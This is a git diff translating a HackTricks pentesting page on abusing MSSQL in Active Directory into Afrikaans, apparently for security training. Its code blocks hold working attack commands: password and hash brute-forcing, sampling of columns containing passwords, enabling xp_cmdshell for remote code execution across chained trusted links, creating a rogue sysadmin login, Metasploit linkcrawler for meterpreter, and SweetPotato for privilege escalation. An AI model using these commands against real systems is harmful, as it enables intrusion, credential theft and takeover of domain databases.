@@ -1,4 +1,4 @@
-# MSSQL AD Abuse
+# MSSQL AD Misbruik
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,14 +6,13 @@
 
 {% embed url="https://websec.nl/" %}
 
-## **MSSQL Enumeration / Discovery**
+## **MSSQL Enumerasie / Ontdekking**
 
 ### Python
 
-The [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool is based on impacket, and allows also authenticate using kerberos tickets, and attack through link chains
+Die [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) hulpmiddel is gebaseer op impacket, en laat ook outentisering toe met kerberos kaartjies, en aanval deur middel van skakelkettings.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
-  
 ```shell
 # Interactive mode
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
@@ -83,9 +82,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-
-### Enumerating from the network without domain session
-
+### Opname vanaf die netwerk sonder domeinsessie
 ```
 
 # Interactive mode
@@ -93,18 +90,14 @@ mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 
 ````
-
 ---
 ###  Powershell
 
-The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is very useful in this case.
-
+Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ````
-
-### Enumerating from the network without domain session
-
+### Opname vanaf die netwerk sonder domeinsessie
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -118,9 +111,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-
-### Enumerating from inside the domain
-
+### Opname vanaf binne die domein
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -139,11 +130,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
+## MSSQL Basiese Misbruik
 
-## MSSQL Basic Abuse
-
-### Access DB
-
+### Toegang tot DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -155,32 +144,28 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 ## This won't use trusted SQL links
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
-
 ### MSSQL RCE
 
-It might be also possible to **execute commands** inside the MSSQL host
-
+Dit mag ook moontlik wees om **opdragte** binne die MSSQL gasheer uit te voer
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
+Kontroleer in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
 
-Check in the page mentioned in the **following section how to do this manually.**
-
-### MSSQL Basic Hacking Tricks
+### MSSQL Basiese Hacking Trukke
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL Trusted Links
+## MSSQL Betroubare Skakels
 
-If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+As 'n MSSQL-instansie betroubaar (databasis skakel) is deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die betroubare databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
-**The links between databases work even across forest trusts.**
+**Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
-### Powershell Abuse
-
+### Powershell Misbruik
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -212,53 +197,45 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-
 ### Metasploit
 
-You can easily check for trusted links using metasploit.
-
+Jy kan maklik vir vertroude skakels kyk met metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misbruik maak (so, as jy nie 'n opdrag met `openquery()` kan uitvoer nie, sal jy die `EXECUTE` metode **handmatig** moet probeer om opdragte uit te voer, sien meer hieronder.)
 
-Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
+### Handmatig - Openquery()
 
-### Manual - Openquery()
+Van **Linux** kan jy 'n MSSQL konsole skulp met **sqsh** en **mssqlclient.py** verkry.
 
-From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
+Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
 
-From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)
-
-_Login using Windows authentication:_
+_Registrasie met Windows-outeentifikasie:_
 
 ![](<../../images/image (808).png>)
 
-#### Find Trustable Links
-
+#### Vind Betroubare Skakels
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-
 ![](<../../images/image (716).png>)
 
-#### Execute queries in trustable link
+#### Voer navrae uit in betroubare skakel
 
-Execute queries through the link (example: find more links in the new accessible instance):
-
+Voer navrae uit deur die skakel (voorbeeld: vind meer skakels in die nuwe toeganklike instansie):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
-
 > [!WARNING]
-> Check where double and single quotes are used, it's important to use them that way.
+> Kyk waar dubbel en enkel aanhalingsmerke gebruik word, dit is belangrik om dit op daardie manier te gebruik.
 
 ![](<../../images/image (643).png>)
 
-You can continue these trusted links chain forever manually.
-
+Jy kan hierdie betroubare skakelketting handmatig vir ewig voortset.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -266,30 +243,26 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
+As jy nie aksies soos `exec xp_cmdshell` vanaf `openquery()` kan uitvoer nie, probeer die `EXECUTE` metode.
 
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+### Handmatig - EXECUTE
 
-### Manual - EXECUTE
-
-You can also abuse trusted links using `EXECUTE`:
-
+Jy kan ook vertroude skakels misbruik met `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
+## Plaaslike Privilege Escalation
 
-## Local Privilege Escalation
+Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "n kliënt na verifikasie te verteenwoordig".
 
-The **MSSQL local user** usually has a special type of privilege called **`SeImpersonatePrivilege`**. This allows the account to "impersonate a client after authentication".
+'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
 
-A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
-
-[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.
+[SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
